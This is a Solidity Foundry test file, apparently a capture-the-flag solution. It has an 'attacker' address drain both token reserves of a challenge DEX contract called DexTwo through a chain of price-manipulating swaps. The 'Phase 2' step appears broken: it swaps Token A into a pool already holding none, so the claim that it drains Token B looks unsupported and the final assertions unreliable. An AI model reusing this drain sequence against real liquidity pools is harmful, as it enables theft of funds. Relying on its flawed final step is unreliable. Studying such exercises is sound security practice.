// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.13;

import {Test, console} from "forge-std/Test.sol";
import {DexTwo, SwappableTokenTwo} from "../src/Swap2.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";

contract DexTwoTest is Test {
    SwappableTokenTwo public swappabletokenA;
    SwappableTokenTwo public swappabletokenB;

    DexTwo public dexTwo;
    address attacker = makeAddr("attacker");

    ///DO NOT TOUCH!!!!
    function setUp() public {
        dexTwo = new DexTwo();
        swappabletokenA = new SwappableTokenTwo(address(dexTwo),"Swap","SW", 110);
        vm.label(address(swappabletokenA), "Token 1");
        swappabletokenB = new SwappableTokenTwo(address(dexTwo),"Swap","SW", 110);
        vm.label(address(swappabletokenB), "Token 2");
        dexTwo.setTokens(address(swappabletokenA), address(swappabletokenB));

        dexTwo.approve(address(dexTwo), 100);
        dexTwo.add_liquidity(address(swappabletokenA), 100);
        dexTwo.add_liquidity(address(swappabletokenB), 100);

        vm.label(attacker, "Attacker");

        IERC20(address(swappabletokenA)).transfer(attacker, 10);
        IERC20(address(swappabletokenB)).transfer(attacker, 10);
      
    }

  function test_drainBothTokens() public {
        vm.startPrank(attacker);
        
        // Approve DexTwo to spend tokens
        swappabletokenA.approve(address(dexTwo), type(uint256).max);
        swappabletokenB.approve(address(dexTwo), type(uint256).max);

        console.log("\nInitial state:");
        logState();

        // Phase 1: Drain Token A
        console.log("\nPhase 1: Draining Token A...");
        
        dexTwo.swap(address(swappabletokenA), address(swappabletokenB), 10);
        console.log("\nSwap 1:");
        logState();

        dexTwo.swap(address(swappabletokenB), address(swappabletokenA), 20);
        console.log("\nSwap 2:");
        logState();

        dexTwo.swap(address(swappabletokenA), address(swappabletokenB), 24);
        console.log("\nSwap 3:");
        logState();

        dexTwo.swap(address(swappabletokenB), address(swappabletokenA), 30);
        console.log("\nSwap 4:");
        logState();

        dexTwo.swap(address(swappabletokenA), address(swappabletokenB), 41);
        console.log("\nSwap 5:");
        logState();

        dexTwo.swap(address(swappabletokenB), address(swappabletokenA), 45);
        console.log("\nToken A drained:");
        logState();

        // Phase 2: Drain Token B
        console.log("\nPhase 2: Draining Token B...");
        
        // We can drain all remaining Token B using the same principle
        dexTwo.swap(address(swappabletokenA), address(swappabletokenB), 45);
        
        console.log("\nFinal state:");
        logState();

        vm.stopPrank();

        // Verify both tokens have been drained
        assertEq(IERC20(address(swappabletokenA)).balanceOf(address(dexTwo)), 0, "DexTwo should have 0 Token A");
        assertEq(IERC20(address(swappabletokenB)).balanceOf(address(dexTwo)), 0, "DexTwo should have 0 Token B");
    }

    function logState() internal view {
        console.log("DexTwo Token A balance:", IERC20(address(swappabletokenA)).balanceOf(address(dexTwo)));
        console.log("DexTwo Token B balance:", IERC20(address(swappabletokenB)).balanceOf(address(dexTwo)));
        console.log("Attacker Token A balance:", IERC20(address(swappabletokenA)).balanceOf(attacker));
        console.log("Attacker Token B balance:", IERC20(address(swappabletokenB)).balanceOf(attacker));
        console.log("---");
    }
}